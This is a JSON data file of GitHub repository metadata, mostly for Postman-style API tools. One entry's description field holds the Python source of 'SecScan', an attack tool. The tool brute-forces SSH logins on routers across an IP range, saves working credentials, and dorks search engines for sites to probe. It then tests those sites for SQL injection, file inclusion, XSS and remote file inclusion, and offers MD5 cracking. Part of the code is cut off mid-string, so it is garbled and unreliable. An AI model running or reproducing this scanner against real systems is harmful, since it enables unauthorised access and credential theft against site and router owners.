[
  {
    "id": 203587744,
    "name": "postwoman",
    "full_name": "liyasthomas/postwoman",
    "description": "👽 A free, fast and beautiful API request builder (web alternative to Postman) https://postwoman.io",
    "fork": false,
    "created_at": "2019-08-21T13:15:24Z",
    "updated_at": "2020-03-30T03:19:25Z",
    "stargazers_count": 18028,
    "watchers_count": 18028,
    "forks": 1105,
    "watchers": 18028,
    "score": 1,
    "owner_id": 10395817,
    "owner_login": "liyasthomas",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/10395817?v=4",
    "pulled": 1,
    "tags": [
      "request",
      "http",
      "https",
      "build",
      "native",
      "alternative",
      "free",
      "builder",
      "postwoman"
    ]
  },
  {
    "id": 24208331,
    "name": "postman",
    "full_name": "salesforce-marketingcloud/postman",
    "description": null,
    "fork": false,
    "created_at": "2014-09-18T23:13:13Z",
    "updated_at": "2020-03-19T09:15:42Z",
    "stargazers_count": 100,
    "watchers_count": 100,
    "forks": 47,
    "watchers": 100,
    "score": 1,
    "owner_id": 12401348,
    "owner_login": "salesforce-marketingcloud",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/12401348?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "user": "aWhereAPI",
    "repo": "API-Postman-Collections",
    "pulled": "Organization",
    "id": 44482794,
    "name": "API-Postman-Collections",
    "full_name": "aWhereAPI/API-Postman-Collections",
    "description": "Use these Postman collections to start playing with the aWhere API Platform without coding. Requires the free Chrome application, Postman, from getpostman.com",
    "fork": false,
    "created_at": "2015-10-18T15:08:28Z",
    "updated_at": "2020-01-27T22:25:57Z",
    "forks": 8,
    "open_issues": 0,
    "watchers": 3,
    "network_count": 8,
    "subscribers_count": 3,
    "owner_id": 11070642,
    "owner_login": "aWhereAPI",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/11070642?v=4",
    "owner_type": "Organization",
    "tags": [
      "collect",
      "collection",
      "collections",
      "form",
      "application",
      "star",
      "start",
      "play",
      "getpost",
      "free",
      "playing",
      "coding"
    ]
  },
  {
    "id": 40419319,
    "name": "V1-API-Postman-Collections",
    "full_name": "aWhereAPI/V1-API-Postman-Collections",
    "description": "These Postman Collections are for the old version of aWhere's APIs. Please use the API Postman Collections repository. Requires the free Chrome application, Postman, from getpostman.com",
    "fork": false,
    "created_at": "2015-08-08T23:26:46Z",
    "updated_at": "2015-10-18T15:21:43Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 1,
    "watchers": 0,
    "score": 1,
    "owner_id": 11070642,
    "owner_login": "aWhereAPI",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/11070642?v=4",
    "pulled": 1,
    "tags": [
      "repo",
      "repos",
      "repository",
      "application",
      "version",
      "getpost",
      "free"
    ]
  },
  {
    "id": 150594472,
    "name": "midtrans-iris-collections",
    "full_name": "empeje/midtrans-iris-collections",
    "description": "[Unofficial] Postman Collections for Midtrans' Iris Disbursement Service | Not maintained anymore, feel free to fork!",
    "fork": false,
    "created_at": "2018-09-27T13:50:48Z",
    "updated_at": "2019-02-03T02:28:07Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 1,
    "watchers": 1,
    "score": 1,
    "owner_id": 11813607,
    "owner_login": "empeje",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/11813607?v=4",
    "pulled": 1,
    "tags": [
      "more",
      "main",
      "official",
      "free",
      "maintained",
      "fork"
    ]
  },
  {
    "id": 17645181,
    "name": "aa.py",
    "full_name": "udinparla/aa.py",
    "description": "#!/usr/bin/env python import re import hashlib import Queue from random import choice import threading import time import urllib2 import sys import socket  try:     import paramiko      PARAMIKO_IMPORTED = True except ImportError:     PARAMIKO_IMPORTED = False    USER_AGENT = [\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3\",              \"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\",              \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\",              \"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\",              \"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\", \t     \"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.38.6 (KHTML, like Gecko) Version/5.1 Safari/535.38.6\", \t     \"Mozilla/5.0 (Macintosh; U; U; PPC Mac OS X 10_6_7 rv:6.0; en-US) AppleWebKit/532.23.3 (KHTML, like Gecko) Version/4.0.2 Safari/532.23.3\"             ] option = ' ' vuln = 0 invuln = 0 np = 0 found = []   class Router(threading.Thread):     \"\"\"Checks for routers running ssh with given User/Pass\"\"\"     def __init__(self, queue, user, passw):         if not PARAMIKO_IMPORTED:             print 'You need paramiko.'             print 'http://www.lag.net/paramiko/'             sys.exit(1)         threading.Thread.__init__(self)              self.queue = queue          self.user = user         self.passw = passw       def run(self):         \"\"\"Tries to connect to given Ip on port 22\"\"\"         ssh = paramiko.SSHClient()         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())         while True:             try:                 ip_add = self.queue.get(False)              except Queue.Empty:                 break             try:                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)                 ssh.close()                 print \"Working: %s:22 - %s:%s\\n\" % (ip_add, self.user, self.passw)                 write = open('Routers.txt', \"a+\")                 write.write('%s:22 %s:%s\\n' % (ip_add, self.user, self.passw))                 write.close()                   self.queue.task_done()              except:                 print 'Not Working: %s:22 - %s:%s\\n' % (ip_add, self.user, self.passw)                 self.queue.task_done()                               class Ip:     \"\"\"Handles the Ip range creation\"\"\"     def __init__(self):         self.ip_range = []         self.start_ip = raw_input('Start ip: ')         self.end_ip = raw_input('End ip: ')         self.user = raw_input('User: ')         self.passw = raw_input('Password: ')         self.iprange()             def iprange(self):         \"\"\"Creates list of Ip's from Start_Ip to End_Ip\"\"\"         queue = Queue.Queue()         start = list(map(int, self.start_ip.split(\".\")))         end = list(map(int, self.end_ip.split(\".\")))         tmp = start                 self.ip_range.append(self.start_ip)         while tmp != end:             start[3] += 1             for i in (3, 2, 1):                 if tmp[i] == 256:                     tmp[i] = 0                     tmp[i-1] += 1             self.ip_range.append(\".\".join(map(str, tmp)))                 for add in self.ip_range:             queue.put(add)          for i in range(10):             thread = Router(queue, self.user, self.passw )             thread.setDaemon(True)             thread.start()          queue.join()   class Crawl:     \"\"\"Searches for dorks and grabs results\"\"\"     def __init__(self):         if option == '4':             self.shell = str(raw_input('Shell location: '))         self.dork = raw_input('Enter your dork: ')         self.queue = Queue.Queue()         self.pages = raw_input('How many pages(Max 20): ')         self.qdork = urllib2.quote(self.dork)         self.page = 1         self.crawler()         def crawler(self):         \"\"\"Crawls Ask.com for sites and sends them to appropriate scan\"\"\"         print '\\nDorking...'         for i in range(int(self.pages)):             host = \"http://uk.ask.com/web?q=%s&page=%s\" % (str(self.qdork), self.page)             req = urllib2.Request(host)             req.add_header('User-Agent', choice(USER_AGENT))             response = urllib2.urlopen(req)             source = response.read()             start = 0             count = 1             end = len(source)             numlinks = source.count('_t\" href', start, end)               while count alert('xssBYm0le');\"\"\"         self.file = 'xss.txt'       def run(self):         \"\"\"Checks Url for possible Xss\"\"\"         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if '=' in site:                 global vuln                 global invuln                 global np                 xsite = site.rsplit('=', 1)[0]                 if xsite[-1] != \"=\":                     xsite = xsite + \"=\"                 test = xsite + self.xchar                 try:                     conn = urllib2.Request(test)                     conn.add_header('User-Agent', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(\"xssBYm0le\", data, re.I)):                         self.xss(test)                         vuln += 1                     else:                         print B+test + W+' > ' + str(vuln) + G+' Vulnerable Sites Found' + W     print '>> ' + str(invuln) + G+' Sites Not Vulnerable' + W     print '>> ' + str(np) + R+' Sites Without Parameters' + W     if option == '1':         print '>> Output Saved To sqli.txt\\n'     elif option == '2':         print '>> Output Saved To lfi.txt'     elif option == '3':         print '>> Output Saved To xss.txt'     elif option == '4':         print '>> Output Saved To rfi.txt'     W  = \"\\033[0m\";   R  = \"\\033[31m\";  G  = \"\\033[32m\";  O  = \"\\033[33m\";  B  = \"\\033[34m\";  def main():     \"\"\"Outputs Menu and gets input\"\"\"     quotes = [ \t'\\nm0le@tormail.org\\n'         ]     print (O+''' ------------- -- SecScan -- --- v1.5 ---- ---- by ----- --- m0le ---- -------------''')     print (G+''' -[1]-  SQLi -[2]-  LFI -[3]-  XSS -[4]-  RFI -[5]-  Proxy -[6]-  Admin Page Finder -[7]-  Sub Domain Scan -[8]-  Dictionary MD5 cracker -[9]-  Online MD5 cracker -[10]- Check your IP address''')      print (B+''' -[!]- If freeze while running or want to quit,  just Ctrl C, it will automatically terminate the job. ''')     print W     global option     option = raw_input('Enter Option: ')       if option:         if option == '1':             Crawl()             output()             print choice(quotes)                      elif option == '2':             Crawl()             output()             print choice(quotes)           elif option == '3':             Crawl()             output()             print choice(quotes)           elif option == '4':             Crawl()             output()             print choice(quotes)               elif option == '5':             Ip()             print choice(quotes)           elif option == '6':             admin()             aprint()             print choice(quotes)          elif option == '7':             subd()             print choice(quotes)          elif option == '8':             word()             print choice(quotes)            elif option == '9':             OnlineCrack().crack()             print choice(quotes)                              elif option == '10':             Check().grab()               print choice(quotes)                 else:             print R+'\\nInvalid Choice\\n' + W             time.sleep(0.9)             main()           else:         print R+'\\nYou Must Enter An Option (Check if your typo is corrected.)\\n' + W         time.sleep(0.9)         main()     if __name__ == '__main__':     main()",
    "fork": false,
    "created_at": "2014-03-11T20:35:08Z",
    "updated_at": "2019-11-23T18:43:58Z",
    "stargazers_count": 4,
    "watchers_count": 4,
    "forks": 0,
    "watchers": 4,
    "score": 1,
    "owner_id": 6923150,
    "owner_login": "udinparla",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/6923150?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "data",
      "file",
      "call",
      "http",
      "user",
      "auto",
      "automat",
      "mail",
      "line",
      "help",
      "route",
      "build",
      "send",
      "list",
      "site",
      "star",
      "source",
      "read",
      "import",
      "running",
      "response",
      "host",
      "start",
      "python",
      "connect",
      "need",
      "shop",
      "name",
      "html",
      "task",
      "search",
      "open",
      "print",
      "result",
      "main",
      "class",
      "automatic",
      "link",
      "header",
      "results",
      "creation",
      "done",
      "find",
      "given",
      "automatically",
      "many",
      "write",
      "location",
      "free",
      "router",
      "output",
      "gets",
      "sends",
      "correct",
      "while",
      "address",
      "pages",
      "found",
      "admin",
      "reading",
      "google",
      "random",
      "seek",
      "crawler",
      "grab"
    ]
  },
  {
    "id": 117061327,
    "name": "apibuilder",
    "full_name": "mathcoder23/apibuilder",
    "description": "基于postman和freemarker 生成多语言的js java api接口库",
    "fork": false,
    "created_at": "2018-01-11T06:43:36Z",
    "updated_at": "2018-01-11T06:44:31Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 17559062,
    "owner_login": "mathcoder23",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/17559062?v=4",
    "pulled": 1,
    "tags": [
      "java",
      "free",
      "freemarker"
    ]
  },
  {
    "id": 153759693,
    "name": "stategen",
    "full_name": "stategen/stategen",
    "description": "通用springMvc/springBoot分布式非强迫性全栈架构(java服务端，H5、iOS、andriod前端)，内含大名鼎鼎的支付宝dalgen之freemarker开源实现之商用升级版dalgenX，是唯一支持迭代开发的全栈代码生成器，大量前、后端代码通过生成器生成，其中后端任意api直接生成前端网络调用、状态化、交互等相关代码，把前后端分离开发\"拉\"回来，目前前端已支持react(dva+umi+typescript)和flutter(provider),后续加入kotlin、swf。免去前端文档、调试、postman、mockjs...繁琐。开发中迭代生成，不改变原开发流程、生成80%代码,兼容后20%你自己的代码，拒绝挖坑！  https://github.com/stategen/stategen",
    "fork": false,
    "created_at": "2018-10-19T09:34:49Z",
    "updated_at": "2020-03-14T08:04:49Z",
    "stargazers_count": 44,
    "watchers_count": 44,
    "forks": 10,
    "watchers": 44,
    "score": 1,
    "owner_id": 44145320,
    "owner_login": "stategen",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/44145320?v=4",
    "pulled": 1,
    "tags": [
      "script",
      "http",
      "https",
      "java",
      "stat",
      "mock",
      "spring",
      "provide",
      "github",
      "react",
      "type",
      "types",
      "free",
      "typescript",
      "provider",
      "freemarker",
      "flutter"
    ]
  }
]